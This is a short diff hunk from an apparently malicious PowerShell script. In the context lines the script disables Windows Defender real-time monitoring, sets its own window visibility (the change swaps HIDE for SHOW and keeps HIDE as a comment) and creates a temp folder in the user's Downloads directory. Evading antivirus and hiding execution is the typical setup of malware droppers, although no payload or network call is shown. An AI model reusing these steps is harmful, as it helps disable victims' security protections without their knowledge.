@@ -80,7 +80,7 @@ Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
 # Disable real time protection
 Set-MpPreference -DisableRealtimeMonitoring $true
 # Minimize window 
-Get-Process -ID $PID | Set-WindowState -State HIDE
+Get-Process -ID $PID | Set-WindowState -State SHOW #HIDE
 # Create a tmp directory in the Downloads folder
 $dir = "C:\Users\$env:UserName\Downloads\tmp"
 New-Item -ItemType Directory -Path $dir
